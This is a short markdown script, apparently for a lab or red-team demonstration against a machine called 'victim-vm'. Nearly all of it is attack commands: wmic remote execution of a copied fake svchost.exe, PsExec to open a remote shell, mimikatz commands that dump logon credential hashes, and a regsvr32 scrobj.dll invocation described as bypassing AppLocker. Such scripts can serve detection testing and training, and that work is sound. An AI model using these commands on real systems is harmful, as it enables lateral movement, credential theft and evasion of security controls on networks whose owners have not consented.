# Script

## Process Execution with WMI
> Use WMI to build a backdoor (See page 17/18 of [Abusing Windows Management Instrumentation by Matt Graeber](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf) for more information on this technique)
```
wmic /node:"victim-vm" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\malicious\svchost.exe"
wmic /node:"victim-vm" process call create "cmd.exe /c c:\malicious\svchost.exe"
```

## Lateral movement
> Start a remote shell on the victim, verify by running ```hostname``` and start mimikatz
```
c:\tools\psexec\PsExec.exe /accepteula \\victim-vm cmd
hostname
c:\tools\mimikatz\x64\mimikatz
```

> In mimikatz execute the following commands and verify if the hashes are visible
```
privilege::debug
sekurlsa::logonpasswords
exit
```

## Arbitrary code execution
> Use regsvr32 to run arbitrary code on the victim and bypass AppLocker (while in the remove shell)
```
cd c:\malicious
regsvr32.exe /s /u /i:C:\tools\test.sct scrobj.dll
```